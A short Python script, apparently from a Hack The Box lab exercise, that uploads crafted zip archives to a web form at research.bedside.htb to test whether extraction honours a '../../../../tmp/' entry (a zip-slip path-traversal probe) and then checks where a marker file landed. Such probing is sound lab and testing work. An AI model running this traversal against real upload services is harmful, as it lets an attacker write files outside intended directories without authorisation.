#!/usr/bin/env python3
import zipfile
import io
import requests

base = 'http://research.bedside.htb/'

def make_zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for name, content in entries.items():
            z.writestr(name, content)
    buf.seek(0)
    return buf.read()

# Test 1: normal nested path
z1 = make_zip({'sub/normal.txt': 'hello-normal'})
r = requests.post(base, files={'uploadFile': ('test1.zip', z1)})
print('upload test1.zip:', r.status_code)
print([l for l in r.text.splitlines() if 'message' in l])

# Test 2: path traversal
z2 = make_zip({'../../../../tmp/ziptrav_marker.txt': 'trav-content'})
r = requests.post(base, files={'uploadFile': ('test2.zip', z2)})
print('upload test2.zip:', r.status_code)
print([l for l in r.text.splitlines() if 'message' in l])

import time
time.sleep(2)

paths = ['uploads/sub/normal.txt', 'uploads/test1.zip', 'uploads/tmp/ziptrav_marker.txt', 'uploads/../tmp/ziptrav_marker.txt']
for p in paths:
    r = requests.get(base + p)
    print(p, '->', r.status_code, r.text[:50] if r.status_code==200 else '')
